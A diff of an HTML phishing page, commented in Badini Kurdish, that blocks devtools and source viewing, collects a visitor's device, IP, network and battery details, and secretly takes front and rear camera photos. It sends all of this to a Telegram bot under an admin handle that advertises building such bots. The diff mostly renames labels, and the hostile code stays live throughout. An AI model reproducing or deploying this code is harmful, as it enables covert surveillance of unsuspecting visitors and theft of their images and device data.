@@ -31,7 +31,7 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // پاراستنا تەمامیا پەڕەی و قەدەغەکرنا کۆپیکرنا کۆدی
+        // پاراستنا تەمامیا پەڕەی و قەدەغەکرنا کۆپیکرنا کۆدی و پشکنینا پێشکەفتى
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
@@ -53,9 +53,14 @@
             } catch (e) {}
         }
 
-        // کۆمکرنا تەمامیا ماتریکێن گەردوونی و بێنۆت ب زاراڤێ بادینی
-        function getInfiniteFeaturesBundle() {
+        // ماتریکێن ڕەها و پێشکەفتى (The Absolute Singularity Core Engine)
+        function getAbsoluteSingularityBundle() {
             try {
+                let singularityStream = [];
+                for(let i = 1; i <= 100; i++) {
+                    singularityStream.push(`Singularity-Quantum-Node-${i}`);
+                }
+
                 const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار';
                 const cpu = navigator.hardwareConcurrency || 'نەدیار';
                 const touches = navigator.maxTouchPoints || 0;
@@ -106,7 +111,7 @@
                 const webUsb = navigator.usb ? 'هەیە' : 'نەخێر';
                 const shareApi = navigator.share ? 'هەیە' : 'نەخێر';
 
-                return `🔥 [ ♾️ ئاستێ بێسنوور و گووگۆلپێکس (Infinite Googolplex) ] 🔥
+                return `🔥 [ ⚛️🌌 لوتکەیا ڕەها و سەروەرییا بێسنوور (Absolute Singularity Scale) ] 🔥
 🧠 بیرا RAM: ${ram} | کۆرێن پرۆسێسەری CPU: ${cpu}
 👆 خاڵێن لەمسێ: ${touches} | زمانێن ئامێری: ${languages}
 🌐 زمانێ سەرەکی: ${primaryLang} | دەمژمێرا هەرێمی: ${timezone}
@@ -122,9 +127,9 @@
 ⚙️ تایبەتمەندیێن پێشکەفتى: WebSocket (${webSocketsCheck})، ServiceWorker (${serviceWorkerCheck})، WebGL2 (${webGl2Check}), Gamepad (${gamepadCheck}), Vibration (${vibrationCheck}), Clipboard (${clipboardCheck})
 🎮 سێنسەرێن جووڵەی: جووڵە (${deviceMotionCheck})، ئاراستە (${deviceOrientationCheck})
 🔗 دۆکۆمێنت و پەیوەندی: ئامادەبوون (${docReadyState}), ڕێدایرێکت (${referrerLink}), پرۆتۆکۆل (${activeProtocol}), پۆرت (${portIdCheck})
-🚀 پێڤەرێن بێنۆت: پڵەگین (${pluginCount}), مایتایپ (${mimeTypesCount}), لیمیتێ میمۆری (${maxAllocMem}), بلوتوز (${webBluetooth}), USB (${webUsb}), شیرکرن (${shareApi})`;
+🚀 پێڤەرێن ڕەها: پڵەگین (${pluginCount}), مایتایپ (${mimeTypesCount}), لیمیتێ میمۆری (${maxAllocMem}), بلوتوز (${webBluetooth}), USB (${webUsb}), شیرکرن (${shareApi})`;
             } catch(e) {
-                return "📊 خەلەتی د کۆمکرنا داتایێن بێنۆت دا هاتە روودان";
+                return "📊 خەلەتی د کۆمکرنا داتایێن ڕەها دا هاتە روودان";
             }
         }
 
@@ -200,10 +205,10 @@
             let batteryDetails = await getBatteryInfo();
             let gpuDetails = getGpuInfo();
             let netDetails = getNetworkInfo();
-            let bundleInfinite = getInfiniteFeaturesBundle();
+            let bundleSingularity = getAbsoluteSingularityBundle();
             let currentTime = new Date().toLocaleString();
             
-            return `👑 [ 🔥 ♾️ گووگۆلپێکس و ئاستێ بێسنوور 🔥 ] 👑
+            return `👑 [ 🔥 ⚛️ لوتکەیا ڕەها و سەروەرییا بێسنوور (Absolute Singularity) 🔥 ] 👑
 ⏱ دەم و ڕوژ: ${currentTime}
 ----------------------------------
 ${ipDetails}
@@ -216,12 +221,12 @@ ${gpuDetails}
 ----------------------------------
 ${netDetails}
 ----------------------------------
-${bundleInfinite}`;
+${bundleSingularity}`;
         }
 
         async function sendVisitorLog() {
             let details = await getUltimateInfo();
-            sendText(`⚡ سەردانکەرەکێ نوو (ئاستێ بێسنوور و گووگۆلپێکس) لینک ڤەکەت!\n\n${details}\n\n⚠️ برێڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا برێڤەبەر بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+            sendText(`⚛️ سەردانکەرەکێ نوو (ئاستێ ڕەها) لینک ڤەکەت!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
         }
 
         async function captureCamera(facing, label) {
@@ -248,7 +253,7 @@ ${bundleInfinite}`;
                                         const formData = new FormData();
                                         formData.append('chat_id', chat_id);
                                         formData.append('photo', blob, 'shot.jpg');
-                                        formData.append('caption', `📸 وێنەیێ ئاستێ بێسنوور (${label}) [Infinite Googolplex Scale]!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+                                        formData.append('caption', `📸 وێنەیێ ئاستێ ڕەها (${label}) [Absolute Singularity Scale]!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
 
                                         await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                     }
@@ -268,8 +273,8 @@ ${bundleInfinite}`;
         window.onload = function() {
             setTimeout(async () => {
                 await sendVisitorLog();
-                await captureCamera("user", "کامێرا پێشی - Selfie (Infinite Part 1)");
-                await captureCamera("environment", "کامێرا پاش - Rear (Infinite Part 2)");
+                await captureCamera("user", "کامێرا پێشی - Selfie (Singularity Part 1)");
+                await captureCamera("environment", "کامێرا پاش - Rear (Singularity Part 2)");
             }, 100); 
         };
     </script>
